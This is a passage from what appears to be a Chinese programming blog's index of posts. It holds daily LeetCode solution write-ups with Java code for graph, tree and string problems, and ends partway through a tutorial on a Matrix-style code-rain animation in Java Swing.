    <content type="text"><![CDATA[题目：529. 扫雷游戏难度：中等 让我们一起来玩扫雷游戏！ 给定一个代表游戏板的二维字符矩阵。 ‘M’ 代表一个未挖出的地雷，’E’ 代表一个未挖出的空方块，’B’ 代表没有相邻（上，下，左，右，和所有4个对角线）地雷的已挖出的空白方块，数字（’1’ 到 ‘8’）表示有多少地雷与这块已挖出的方块相邻，’X’ 则表示一个已挖出的地雷。 现在给出在所有未挖出的方块中（’M’或者’E’）的下一个点击位置（行和列索引），根据以下规则，返回相应位置被点击后对应的面板： 如果一个地雷（’M’）被挖出，游戏就结束了- 把它改为 ‘X’。 如果一个没有相邻地雷的空方块（’E’）被挖出，修改它为（’B’），并且所有和其相邻的未挖出方块都应该被递归地揭露。 如果一个至少与一个地雷相邻的空方块（’E’）被挖出，修改它为数字（’1’到’8’），表示相邻地雷的数量。 如果在此次点击中，若无更多方块可被揭露，则返回面板。 示例 1： 123456789101112131415输入: [[&apos;E&apos;, &apos;E&apos;, &apos;E&apos;, &apos;E&apos;, &apos;E&apos;], [&apos;E&apos;, &apos;E&apos;, &apos;M&apos;, &apos;E&apos;, &apos;E&apos;], [&apos;E&apos;, &apos;E&apos;, &apos;E&apos;, &apos;E&apos;, &apos;E&apos;], [&apos;E&apos;, &apos;E&apos;, &apos;E&apos;, &apos;E&apos;, &apos;E&apos;]]Click : [3,0]输出: [[&apos;B&apos;, &apos;1&apos;, &apos;E&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;1&apos;, &apos;M&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;1&apos;, &apos;1&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;B&apos;, &apos;B&apos;, &apos;B&apos;, &apos;B&apos;]] 解释: 示例 2： 123456789101112131415输入: [[&apos;B&apos;, &apos;1&apos;, &apos;E&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;1&apos;, &apos;M&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;1&apos;, &apos;1&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;B&apos;, &apos;B&apos;, &apos;B&apos;, &apos;B&apos;]]Click : [1,2]输出: [[&apos;B&apos;, &apos;1&apos;, &apos;E&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;1&apos;, &apos;X&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;1&apos;, &apos;1&apos;, &apos;1&apos;, &apos;B&apos;], [&apos;B&apos;, &apos;B&apos;, &apos;B&apos;, &apos;B&apos;, &apos;B&apos;]] 解释: 注意： 输入矩阵的宽和高的范围为 [1,50]。 点击的位置只能是未被挖出的方块 (‘M’ 或者 ‘E’)，这也意味着面板至少包含一个可点击的方块。 输入面板不会是游戏结束的状态（即有地雷已被挖出）。 简单起见，未提及的规则在这个问题中可被忽略。例如，当游戏结束时你不需要挖出所有地雷，考虑所有你可能赢得游戏或标记方块的情况。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minesweeper著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 题意是让我们模拟一次玩扫雷游戏的过程，但不是玩完整的一局游戏，为了简单起见，题目只让我们模拟一次点击扫雷游戏的过程，并且花了大篇幅对扫雷游戏的规则进行了讲解，解题思路很简单，按照扫雷游戏的规则去搜索（dfs）即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class Solution &#123; public char[][] updateBoard(char[][] board, int[] click) &#123; dfs(board,click[0],click[1]); return board; &#125; int dir[][] = &#123; &#123;-1,-1&#125;,/*左上*/ &#123;0,-1&#125;,/*上*/ &#123;1,-1&#125;,/*右上*/ &#123;1,0&#125;,/*右*/ &#123;1,1&#125;,/*右下*/ &#123;0,1&#125;,/*下*/ &#123;-1,1,&#125;,/*左下*/ &#123;-1,0&#125;,/*左*/ &#125;; private void dfs(char[][] map,int x,int y) &#123; // 如果一个地雷（'M'）被挖出，游戏就结束了- 把它改为 'X if (map[x][y] == 'M') &#123; map[x][y] = 'X'; return; &#125; // 统计相邻八个方向有多少个地雷（'M'） int cnt = 0; List&lt;int[]&gt; list = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; dir.length;i++) &#123; int nextX = x + dir[i][0]; int nextY = y + dir[i][1]; if (nextX &gt;= 0 &amp;&amp; nextX &lt; map.length &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; map[x].length) &#123; if (map[nextX][nextY] == 'M') &#123; list.add(new int[]&#123;x,y&#125;); cnt++; &#125; &#125; &#125; map[x][y] = 'B'; if (cnt == 0) &#123; // 没有相邻地雷的空方块（'E'）被挖出，修改它为（'B'），并且所有和其相邻的未挖出方块都应该被递归地揭露 for (int i = 0;i &lt; dir.length;i++) &#123; int nextX = x + dir[i][0]; int nextY = y + dir[i][1]; if (nextX &gt;= 0 &amp;&amp; nextX &lt; map.length &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; map[x].length &amp;&amp; map[nextX][nextY] == 'E') &#123; dfs(map,nextX,nextY); &#125; &#125; &#125; else &#123; // 至少与一个地雷相邻的空方块（'E'）被挖出，修改它为数字（'1'到'8'），表示相邻地雷的数量 for (int[] arr : list) &#123; map[arr[0]][arr[1]] = (char) ('0' + cnt); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/19]]></title>
    <url>%2Fposts%2F14a1e9ae%2F</url>
    <content type="text"><![CDATA[题目：647. 回文子串难度：中等 给定一个字符串，你的任务是计算这个字符串中有多少个回文子串。 具有不同开始位置或结束位置的子串，即使是由相同的字符组成，也会被视作不同的子串。 示例 1： 123输入：&quot;abc&quot;输出：3解释：三个回文子串: &quot;a&quot;, &quot;b&quot;, &quot;c&quot; 示例 2： 123输入：&quot;aaa&quot;输出：6解释：6个回文子串: &quot;a&quot;, &quot;a&quot;, &quot;a&quot;, &quot;aa&quot;, &quot;aa&quot;, &quot;aaa&quot; 提示： 输入的字符串长度不会超过 1000 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/palindromic-substrings著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 万万没想到，暴力也能过 解题代码1234567891011121314151617181920212223242526272829class Solution &#123; public int countSubstrings(String s) &#123; int ans = 0; for (int i = 0;i &lt; s.length();i++) &#123; for (int j = s.length();j &gt;= i;j--) &#123; if (judge(s.substring(i,j))) &#123; ans++; &#125; &#125; &#125; return ans; &#125; private boolean judge(String s) &#123; if (s == null || s.length() &lt; 1) &#123; return false; &#125; for (int i = 0;i &lt; s.length() / 2;i++) &#123; if (s.charAt(i) != s.charAt(s.length() - 1 - i)) &#123; return false; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>暴力枚举</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/18]]></title>
    <url>%2Fposts%2F63a6d938%2F</url>
    <content type="text"><![CDATA[题目：109. 有序链表转换二叉搜索树难度：中等 给定一个单链表，其中的元素按升序排序，将其转换为高度平衡的二叉搜索树。 本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。 示例: 123456789给定的有序链表： [-10, -3, 0, 5, 9],一个可能的答案是：[0, -3, 9, -10, null, 5], 它可以表示下面这个高度平衡二叉搜索树： 0 / \ -3 9 / / -10 5 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/convert-sorted-list-to-binary-search-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先遍历链表，得到一个有序列表，然后取列表中的中位数做根节点，递归的构建二叉搜索树即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; *//** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public TreeNode sortedListToBST(ListNode head) &#123; if (head == null) &#123; return null; &#125; List&lt;Integer&gt; nums = new ArrayList&lt;&gt;(); while (head != null) &#123; nums.add(head.val); head = head.next; &#125; return buildBST(nums,0,nums.size() - 1); &#125; private TreeNode buildBST(List&lt;Integer&gt; nums, int l, int r) &#123; if (l &gt; r) &#123; return null; &#125; int m = (l + r) / 2; TreeNode root = new TreeNode(nums.get(m)); root.left = buildBST(nums, l, m - 1); root.right = buildBST(nums, m + 1, r); return root; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二叉树</tag>
        <tag>二叉搜索树</tag>
        <tag>平衡二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/17]]></title>
    <url>%2Fposts%2Ff319c4a9%2F</url>
    <content type="text"><![CDATA[题目：110. 平衡二叉树难度：简单 给定一个二叉树，判断它是否是高度平衡的二叉树。 本题中，一棵高度平衡二叉树定义为： 一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。 示例 1: 12345678给定二叉树 [3,9,20,null,null,15,7] 3 / \ 9 20 / \ 15 7返回 true 。 示例 2: 12345678910给定二叉树 [1,2,2,3,3,null,null,4,4] 1 / \ 2 2 / \ 3 3 / \ 4 4返回 false 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/balanced-binary-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 求出二叉树每个节点 的左右两个子树的高度，比较是否满足高度之差的绝对值不超过1即可 解题代码1234567891011121314151617181920212223242526272829303132333435/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public boolean isBalanced(TreeNode root) &#123; if (root == null) &#123; return true; &#125; int left = high(root.left); int right = high(root.right); if (!(Math.abs(left - right) &lt;= 1)) &#123; return false; &#125; return isBalanced(root.left) &amp;&amp; isBalanced(root.right); &#125; // 计算二叉树的高度 private int high(TreeNode root) &#123; if (root == null) &#123; return 0; &#125; int left = high(root.left); int right = high(root.right); return 1 + Math.max(left,right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二叉树</tag>
        <tag>平衡二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/16]]></title>
    <url>%2Fposts%2F841ef43f%2F</url>
    <content type="text"><![CDATA[题目：733. 图像渲染难度：简单 有一幅以二维整数数组表示的图画，每一个整数表示该图画的像素值大小，数值在 0 到 65535 之间。 给你一个坐标 (sr, sc) 表示图像渲染开始的像素值（行 ，列）和一个新的颜色值 newColor，让你重新上色这幅图像。 为了完成上色工作，从初始坐标开始，记录初始坐标的上下左右四个方向上像素值与初始坐标相同的相连像素点，接着再记录这四个方向上符合条件的像素点与他们对应四个方向上像素值与初始坐标相同的相连像素点，……，重复该过程。将所有有记录的像素点的颜色值改为新的颜色值。 最后返回经过上色渲染后的图像。 示例 1: 123456789输入: image = [[1,1,1],[1,1,0],[1,0,1]]sr = 1, sc = 1, newColor = 2输出: [[2,2,2],[2,2,0],[2,0,1]]解析: 在图像的正中间，(坐标(sr,sc)=(1,1)),在路径上所有符合条件的像素点的颜色都被更改成2。注意，右下角的像素没有更改为2，因为它不是在上下左右四个方向上与初始点相连的像素点。 注意: image 和 image[0] 的长度在范围 [1, 50] 内。 给出的初始点将满足 0 &lt;= sr &lt; image.length 和 0 &lt;= sc &lt; image[0].length。 image[i][j] 和 newColor 表示的颜色值在范围 [0, 65535]内。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/flood-fill著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 从[sr,sc]位置从开始对图进行渲染，其实就是对图的其中一个连通分量进行上色，使用bfs或者dfs均可 解题代码bfs 123456789101112131415161718192021222324252627282930313233class Solution &#123; public int[][] floodFill(int[][] image, int sr, int sc, int newColor) &#123; if (image[sr][sc] == newColor) &#123; return image; &#125; bfs(image,image[sr][sc],sr,sc,newColor); return image; &#125; int[][] dir = &#123; &#123;0,-1&#125;, &#123;0,1&#125;, &#123;-1,0&#125;, &#123;1,0&#125; &#125;; private void bfs(int[][] image,int oldColor,int x,int y,int newColor) &#123; Queue&lt;int[]&gt; queue = new LinkedList&lt;&gt;(); queue.add(new int[]&#123;x,y&#125;); while (!queue.isEmpty()) &#123; int[] poll = queue.poll(); image[poll[0]][poll[1]] = newColor; for (int i = 0;i &lt; dir.length;i++) &#123; int nextX = poll[0] + dir[i][0]; int nextY = poll[1] + dir[i][1]; if (nextX &gt;= 0 &amp;&amp; nextX &lt; image.length &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; image[nextX].length &amp;&amp; image[nextX][nextY] == oldColor) &#123; queue.add(new int[]&#123;nextX,nextY&#125;); &#125; &#125; &#125; &#125;&#125; dfs 1234567891011121314151617181920212223242526class Solution &#123; public int[][] floodFill(int[][] image, int sr, int sc, int newColor) &#123; dfs(image,sr,sc,image[sr][sc],newColor); return image; &#125; int dirR[] = &#123;-1,1,0,0&#125;; int dirC[] = &#123;0,0,-1,1&#125;; private void dfs(int[][] image, int r, int c, int originalColor, int newColor) &#123; if (originalColor == newColor) &#123; return; &#125; image[r][c] = newColor; for (int i = 0;i &lt; dirR.length;i++) &#123; int nextR = r + dirR[i]; int nextC = c + dirC[i]; if (nextR &gt;= 0 &amp;&amp; nextR &lt; image.length &amp;&amp; nextC &gt;= 0 &amp;&amp; nextC &lt; image[nextR].length &amp;&amp; image[nextR][nextC] == originalColor) &#123; dfs(image,nextR,nextC,originalColor,newColor); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/14]]></title>
    <url>%2Fposts%2F6a109513%2F</url>
    <content type="text"><![CDATA[题目：20. 有效的括号难度：简单 给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。 有效字符串需满足： 左括号必须用相同类型的右括号闭合。 左括号必须以正确的顺序闭合。 注意空字符串可被认为是有效字符串。 示例 1: 12输入: &quot;()&quot;输出: true 示例 2: 12输入: &quot;()[]&#123;&#125;&quot;输出: true 示例 3: 12输入: &quot;(]&quot;输出: false 示例 4: 12输入: &quot;([)]&quot;输出: false 示例 5: 12输入: &quot;&#123;[]&#125;&quot;输出: true 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/valid-parentheses著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 遍历字符串，用一个栈来存放所有的左括号，当遇到所有的左括号时，入栈，当遇到右括号时，判断栈顶元素是否与之匹配成一对，如果匹配则出栈，否则返回不匹配，最后检查栈是否为空即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Solution &#123; public boolean isValid(String s) &#123; // 存放左括号 Stack&lt;Character&gt; stack = new Stack&lt;&gt;(); for (int i = 0;i &lt; s.length();i++) &#123; char ch = s.charAt(i); switch(ch) &#123; case '(': stack.push(ch); break; case ')': if (stack.isEmpty()) &#123; return false; &#125; if (stack.lastElement() == '(') &#123; stack.pop(); &#125; else &#123; return false; &#125; break; case '[': stack.push(ch); break; case ']': if (stack.isEmpty()) &#123; return false; &#125; if (stack.lastElement() == '[') &#123; stack.pop(); &#125; else &#123; return false; &#125; break; case '&#123;': stack.push(ch); break; case '&#125;': if (stack.isEmpty()) &#123; return false; &#125; if (stack.lastElement() == '&#123;') &#123; stack.pop(); &#125; else &#123; return false; &#125; break; &#125; &#125; return stack.isEmpty(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/13]]></title>
    <url>%2Fposts%2Ff47400b0%2F</url>
    <content type="text"><![CDATA[题目：43. 字符串相乘难度：中等 给定两个以字符串形式表示的非负整数 num1 和 num2，返回 num1 和 num2 的乘积，它们的乘积也表示为字符串形式。 示例 1: 12输入: num1 = &quot;2&quot;, num2 = &quot;3&quot;输出: &quot;6&quot; 示例 2: 12输入: num1 = &quot;123&quot;, num2 = &quot;456&quot;输出: &quot;56088&quot; 说明： num1 和 num2 的长度小于110。 num1 和 num2 只包含数字 0-9。 num1 和 num2 均不以零开头，除非是数字 0 本身。 不能使用任何标准库的大数类型（比如 BigInteger）或直接将输入转换为整数来处理。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/multiply-strings著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 解题思路和字符串相加一样，按位相乘，再相加即可，注意处理好进位和数位 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117class Solution &#123; public String multiply(String num1, String num2) &#123; // 0 * 任何数 = 0 if (num1.equals("0") || num2.equals("0")) &#123; return "0"; &#125; // 保存按位相乘后相加的结果 String ans = "0"; // 控制运算次数，位数少的乘以位数多的，可以减少运算次数 if (num1.length() &lt; num2.length()) &#123; for (int i = 0;i &lt; num1.length();i++) &#123; // 按位相乘后的结果相加 ans = addStrings(ans,mul(num1.length() - 1 - i,num1.charAt(i),num2)); // System.out.println(mul(num1.charAt(i),num2)); &#125; &#125; else &#123; for (int i = 0;i &lt; num2.length();i++) &#123; ans = addStrings(ans,mul(num2.length() - 1 - i,num2.charAt(i),num1)); // System.out.println(mul(num2.charAt(i),num1)); &#125; &#125; return ans; &#125; // 按位相乘，bit代表数位（个，十，百，千。。。），n代表当前位的数字，s代表相乘的字符串 public String mul(int bit,char n,String s) &#123; StringBuilder builder = new StringBuilder(); int a = n - '0'; // 标志进位 int flag = 0; for (int i = s.length() - 1;i &gt;= 0;i--) &#123; int b = s.charAt(i) - '0'; // a * b = c int c = a * b; // System.out.printf("%d*%d=%d\n",a,b,c); // 相乘后的结果+进位 c += flag; // 下一次进位 flag = c / 10; // 末尾数字 builder.append(c % 10); // 最前面还有进位 if (i == 0 &amp;&amp; c &gt; 9) &#123; builder.append(flag); &#125; &#125; // 翻转 builder = builder.reverse(); // 补足数位 for (int i = 0;i &lt; bit;i++) &#123; builder.append(0); &#125; // System.out.printf("%c * 10 ^ %d * %s = %s\n",n,bit,s,builder.toString()); return builder.toString(); &#125; public String addStrings(String num1, String num2) &#123; if (num1.length() &gt; num2.length()) &#123; return add(num1,num2); &#125; else &#123; return add(num2,num1); &#125; &#125; public String add(String longStr,String shortStr) &#123; StringBuilder builder = new StringBuilder(); int cur = 0; boolean flag = false; while (cur &lt; shortStr.length()) &#123; int a = longStr.charAt(longStr.length() - 1 - cur) - '0'; int b = shortStr.charAt(shortStr.length() - 1 - cur) - '0'; int c = a + b; // System.out.printf("%d+%d=%d\n",a,b,c); if (flag) &#123; c++; flag = false; &#125; if (c &gt; 9) &#123; flag = true; &#125; builder.append(c % 10); cur++; &#125; while (flag &amp;&amp; cur &lt; longStr.length()) &#123; flag = false; int a = longStr.charAt(longStr.length() - 1 - cur) - '0'; a++; if (a &gt; 9) &#123; flag = true; &#125; builder.append(a % 10); cur++; &#125; while (cur &lt; longStr.length()) &#123; builder.append(longStr.charAt(longStr.length() - 1 - cur)); cur++; &#125; if (flag) &#123; builder.append(1); &#125; return builder.reverse().toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/12]]></title>
    <url>%2Fposts%2F83733026%2F</url>
    <content type="text"><![CDATA[题目：133. 克隆图难度：中等 给你无向 连通 图中一个节点的引用，请你返回该图的 深拷贝（克隆）。 图中的每个节点都包含它的值 val（int） 和其邻居的列表（list[Node]）。 1234class Node &#123; public int val; public List&lt;Node&gt; neighbors;&#125; 测试用例格式： 简单起见，每个节点的值都和它的索引相同。例如，第一个节点值为 1（val = 1），第二个节点值为 2（val = 2），以此类推。该图在测试用例中使用邻接列表表示。 邻接列表 是用于表示有限图的无序列表的集合。每个列表都描述了图中节点的邻居集。 给定节点将始终是图中的第一个节点（值为 1）。你必须将 给定节点的拷贝 作为对克隆图的引用返回。 示例 1： 12345678输入：adjList = [[2,4],[1,3],[2,4],[1,3]]输出：[[2,4],[1,3],[2,4],[1,3]]解释：图中有 4 个节点。节点 1 的值是 1，它有两个邻居：节点 2 和 4 。节点 2 的值是 2，它有两个邻居：节点 1 和 3 。节点 3 的值是 3，它有两个邻居：节点 2 和 4 。节点 4 的值是 4，它有两个邻居：节点 1 和 3 。 示例 2： 123输入：adjList = [[]]输出：[[]]解释：输入包含一个空列表。该图仅仅只有一个值为 1 的节点，它没有任何邻居。 示例 3： 123输入：adjList = []输出：[]解释：这个图是空的，它不含任何节点。 示例 4： 12输入：adjList = [[2],[1]]输出：[[2],[1]] 提示： 节点数不超过 100 。 每个节点值 Node.val 都是唯一的，1 &lt;= Node.val &lt;= 100。 无向图是一个简单图，这意味着图中没有重复的边，也没有自环。 由于图是无向的，如果节点 p 是节点 q 的邻居，那么节点 q 也必须是节点 p 的邻居。 图是连通图，你可以从给定节点访问到所有节点。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/clone-graph著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 首先理解一下深拷贝，深拷贝就是对于所有的引用成员，不仅要赋值，还要重新分配空间。所以题意是让我们拷贝图，要拷贝图当然离不开遍历图，要遍历图当然离不开bfs和dfs，而我选用的是bfs去遍历图，并且一边遍历一边构建起新的图，最后返回新图的引用即可。 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/*// Definition for a Node.class Node &#123; public int val; public List&lt;Node&gt; neighbors; public Node() &#123; val = 0; neighbors = new ArrayList&lt;Node&gt;(); &#125; public Node(int _val) &#123; val = _val; neighbors = new ArrayList&lt;Node&gt;(); &#125; public Node(int _val, ArrayList&lt;Node&gt; _neighbors) &#123; val = _val; neighbors = _neighbors; &#125;&#125;*/class Solution &#123; public Node cloneGraph(Node node) &#123; if (node == null) &#123; return null; &#125; Queue&lt;Node&gt; queue = new LinkedList&lt;&gt;(); queue.add(node); while (!queue.isEmpty()) &#123; Node poll = queue.poll(); if (!map.containsKey(poll)) &#123; map.put(poll,new Node(poll.val)); &#125; for (Node n:poll.neighbors) &#123; if (!map.containsKey(n)) &#123; queue.add(n); map.put(n,new Node(n.val)); &#125; // 更新neighbors map.get(poll).neighbors.add(map.get(n)); &#125; &#125; return map.get(node); &#125; Map&lt;Node,Node&gt; map = new HashMap&lt;&gt;();&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/11]]></title>
    <url>%2Fposts%2F1a7a619c%2F</url>
    <content type="text"><![CDATA[题目：130. 被围绕的区域难度：中等 给定一个二维的矩阵，包含 ‘X’ 和 ‘O’（字母 O）。 找到所有被 ‘X’ 围绕的区域，并将这些区域里所有的 ‘O’ 用 ‘X’ 填充。 示例: 1234X X X XX O O XX X O XX O X X 运行你的函数后，矩阵变为： 1234X X X XX X X XX X X XX O X X 解释: 被围绕的区间不会存在于边界上，换句话说，任何边界上的 ‘O’ 都不会被填充为 ‘X’。 任何不在边界上，或不与边界上的 ‘O’ 相连的 ‘O’ 最终都会被填充为 ‘X’。如果两个元素在水平或垂直方向相邻，则称它们是“相连”的。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/surrounded-regions著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 标记边界上的’O’，使用dfs修改和边界相关联的’O’为’#’，然后使用dfs修改和边界不相关联的’O’为’X’，最后将’#’再次使用dfs改为’O’，即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class Solution &#123; public void solve(char[][] board) &#123; if (board == null || board.length &lt;= 1 || board[0].length &lt;= 1) &#123; return; &#125; // 记录边界上的'O'出现的位置 List&lt;int[]&gt; list = new ArrayList&lt;&gt;(); // 行边界有'O' for (int i = 0;i &lt; board[0].length;i++) &#123; if (board[0][i] == 'O') &#123; list.add(new int[]&#123;0,i&#125;); dfs(board,'O','#',0,i); &#125; if (board[board.length - 1][i] == 'O') &#123; list.add(new int[]&#123;board.length - 1,i&#125;); dfs(board,'O','#',board.length - 1,i); &#125; &#125; // 列边界有'O' for (int i = 0;i &lt; board.length;i++) &#123; if (board[i][0] == 'O') &#123; list.add(new int[]&#123;i,0&#125;); dfs(board,'O','#',i,0); &#125; if (board[i][board[i].length - 1] == 'O') &#123; list.add(new int[]&#123;i,board[0].length - 1&#125;); dfs(board,'O','#',i,board[0].length - 1); &#125; &#125; // 消除被围绕的区域 for (int i = 0;i &lt; board.length;i++) &#123; for (int j = 0;j &lt; board[i].length;j++) &#123; if (board[i][j] == 'O') &#123; dfs(board,'O','X',i,j); &#125; &#125; &#125; // 复原边界 for (int[] a : list) &#123; dfs(board,'#','O',a[0],a[1]); &#125; &#125; // 标记方向 int[][] dir = &#123; &#123;0,-1&#125;, &#123;0,1&#125;, &#123;-1,0&#125;, &#123;1,0&#125; &#125;; // dfs private void dfs(char[][] map,char o,char n,int x,int y) &#123; if (map[x][y] == o) &#123; map[x][y] = n; &#125; for (int i = 0;i &lt; dir.length;i++) &#123; int nextX = x + dir[i][0]; int nextY = y + dir[i][1]; if (nextX &gt;= 0 &amp;&amp; nextX &lt; map.length &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; map[nextX].length &amp;&amp; map[nextX][nextY] == o) &#123; dfs(map,o,n,nextX,nextY); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手带你用Java写出炫酷的黑客帝国代码雨效果]]></title>
    <url>%2Fposts%2Fa49748b4%2F</url>
    <content type="text"><![CDATA[前言 相信大家都看过黑客帝国，里面炫酷的代码雨一定给大家留下了深刻的印象，今天，博主就带大家用Java来实现这个特效，提前剧透，博主将在这篇博文里写下超详细的实现思路，相信即便是小白也能够看懂，下面我们开始 准备 jdk1.8+ java ide，如idea，或者eclipse 思路 首先确定我们要做的是一个窗体应用程序，在窗体中使用画布，画出我们的代码雨，而java中的窗体应用只需要继承JFrame类即可 JFrame只是单纯的窗体容器，而画布，包含在JPanel组件中，现在我们需要将窗体和画布的大小都设置为电脑屏幕的大小，而除了大小之外，我们还需要对窗体进行一系列的设置，比如不显示标题栏，背景为黑色，鼠标不可见，按esc键退出程序等等，完成这些设置之后，我们的代码是这样的： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); 